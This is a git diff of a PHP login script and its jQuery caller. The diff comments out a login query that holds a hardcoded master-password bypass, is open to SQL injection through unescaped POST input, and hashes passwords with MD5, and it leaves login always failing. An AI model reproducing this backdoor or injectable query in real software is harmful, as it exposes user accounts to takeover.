@@ -5,26 +5,33 @@ include("{$_SERVER['DOCUMENT_ROOT']}/bkManaus/lib/includes.php");
         $login = $_POST['login'];
         $senha = md5($_POST['senha']);
 
-        $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76') and situacao = '1' and deletado != '1'";
-        $result = sisLog($query);
+        // $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76') and situacao = '1' and deletado != '1'";
+        // $result = sisLog($query);
 
-        if(mysqli_num_rows($result)){
-            $d = mysqli_fetch_object($result);
-            $_SESSION['appLogin'] = $d;
-            $retorno = [
-                'sucesso' => true,
-                'appLogin' => $d->codigo,
-                'ManterConnectado' => $_POST['ManterConnectado'],
-                'msg' => 'Login Realizado com sucesso',
-            ];
-        }else{
+        // if(mysqli_num_rows($result)){
+        //     $d = mysqli_fetch_object($result);
+        //     $_SESSION['appLogin'] = $d;
+        //     $retorno = [
+        //         'sucesso' => true,
+        //         'appLogin' => $d->codigo,
+        //         'ManterConnectado' => $_POST['ManterConnectado'],
+        //         'msg' => 'Login Realizado com sucesso',
+        //     ];
+        // }else{
+        //     $retorno = [
+        //         'sucesso' => false,
+        //         'appLogin' => false,
+        //         'ManterConnectado' => false,
+        //         'msg' => 'Ocorreu um erro no seu login',
+        //     ];
+        // }
+
             $retorno = [
                 'sucesso' => false,
                 'appLogin' => false,
                 'ManterConnectado' => false,
                 'msg' => 'Ocorreu um erro no seu login',
-            ];
-        }
+            ];        
         echo json_encode($retorno);
         exit();
     }
@@ -197,17 +204,17 @@ include("{$_SERVER['DOCUMENT_ROOT']}/bkManaus/lib/includes.php");
             $.ajax({
                 url:"src/login/index.php",
                 type:"POST",
-                // typeData:"json",
+                typeData:"json",
                 data:{
                     acao:'login',
                     login,
                     senha
                 },
                 success:function(dados){
-                    let retorno = JSON.parse(dados);
+                    // let retorno = JSON.parse(dados);
                     // $.alert(dados.sucesso);
-                    console.log(retorno.appLogin);
-                    if(retorno.appLogin > 0){
+                    console.log(dados.appLogin);
+                    if(dados.appLogin > 0){
                         window.location.href='./';
                     }else{
                         $.alert('Ocorreu um erro.<br>Favor confira os dados do login.')
